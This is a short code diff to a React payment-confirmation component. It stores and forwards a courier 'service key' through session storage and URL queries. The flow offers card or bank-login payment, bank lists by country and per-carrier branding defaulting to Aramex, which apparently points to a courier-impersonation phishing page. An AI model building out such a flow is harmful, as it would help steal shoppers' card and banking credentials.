@@ -18,6 +18,7 @@ import {
   Building2,
   ShieldCheck,
 } from "lucide-react";
+import FullScreenLoader from "@/components/FullScreenLoader";
 
 type PaymentMethod = "card" | "login";
 
@@ -31,6 +32,7 @@ const PaymentTrackConfirm = () => {
   const [selectedBank, setSelectedBank] = useState<string>("");
 
   const urlServiceKey = typeof window !== "undefined" ? new URLSearchParams(window.location.search).get("service") : null;
+  const storedServiceKey = typeof window !== "undefined" ? sessionStorage.getItem("serviceKey") : null;
 
   if (isLoading) {
     return <FullScreenLoader label="جاري تحميل تفاصيل الدفع..." />;
@@ -44,10 +46,17 @@ const PaymentTrackConfirm = () => {
   const countryData = getCountryByCode(countryCode);
 
   const payload = (linkData.payload ?? {}) as Record<string, any>;
-  const serviceKey = payload.service_key || payload.service || payload.carrier || urlServiceKey || "aramex";
+  const serviceKey = payload.service_key || payload.service || payload.carrier || urlServiceKey || storedServiceKey || "aramex";
   const serviceName = payload.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
   const banks = useMemo<Bank[]>(() => getBanksByCountry(countryCode?.toUpperCase() || ""), [countryCode]);
+  const serviceQuery = serviceKey ? `?service=${encodeURIComponent(serviceKey)}` : "";
+
+  useEffect(() => {
+    if (serviceKey) {
+      sessionStorage.setItem("serviceKey", serviceKey);
+    }
+  }, [serviceKey]);
 
   const codAmount = payload.cod_amount ?? 0;
 
@@ -116,7 +125,7 @@ const PaymentTrackConfirm = () => {
       sessionStorage.setItem("selectedBank", "skipped");
     }
 
-    navigate(`/pay/${id}/recipient`);
+    navigate(`/pay/${id}/recipient${serviceQuery}`);
   };
 
   const formattedAmount = countryData
